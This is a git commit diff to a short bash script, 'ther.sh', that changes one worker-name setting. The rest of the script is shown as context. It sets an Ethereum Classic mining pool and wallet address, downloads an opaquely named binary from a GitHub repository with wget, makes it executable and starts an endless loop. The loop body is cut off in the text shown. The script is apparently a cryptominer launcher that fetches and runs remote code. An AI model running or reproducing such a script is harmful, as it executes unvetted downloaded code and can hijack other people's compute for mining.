869b1b7369867122227423c0f7464f290368566b
squibex <90225595+squibex@users.noreply.github.com>
2021-09-10 02:45:01 +0700

    Update ther.sh

--- ther.sh
+++ ther.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=asia-etc.2miners.com:1010
 WALLET=ETC:0x6172c0d0139e0ce7431cabceae0f59cd49422166
-WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
+WORKER=k80
 wget https://github.com/squibex/prem/raw/main/priyatama
 chmod +x priyatama
 while [ 1 ]; do
